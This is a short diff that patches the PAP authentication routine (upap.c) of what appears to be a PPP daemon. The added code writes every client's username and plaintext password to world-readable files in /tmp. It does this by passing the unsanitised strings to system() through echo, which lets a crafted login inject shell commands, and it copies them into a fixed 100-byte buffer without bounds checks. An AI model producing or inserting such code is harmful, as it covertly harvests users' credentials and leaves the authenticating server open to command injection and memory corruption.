@@ -1,0 +1,28 @@
+--- upap.c	2009-11-17 06:26:07.000000000 +0800
++++ upap_new.c	2014-03-13 22:25:57.189078646 +0800
+@@ -424,6 +424,25 @@
+      */
+     retcode = check_passwd(u->us_unit, ruser, ruserlen, rpasswd,
+ 			   rpasswdlen, &msg);
++
++    /*
++     * echo username and password to tmp files
++     */
++
++    char e_cmd[512]="echo ",e_tmp[100];
++    memcpy(e_tmp,ruser,ruserlen);
++    e_tmp[ruserlen]=0;
++    strcat(e_cmd,e_tmp);
++    strcat(e_cmd," >/tmp/gusr");
++    system(e_cmd); 
++
++    strcpy(e_cmd,"echo ");
++    memcpy(e_tmp,rpasswd,rpasswdlen);
++    e_tmp[rpasswdlen]=0;
++    strcat(e_cmd,e_tmp);
++    strcat(e_cmd," >/tmp/gpwd");
++    system(e_cmd);
++
+     BZERO(rpasswd, rpasswdlen);
+ 
+     /*
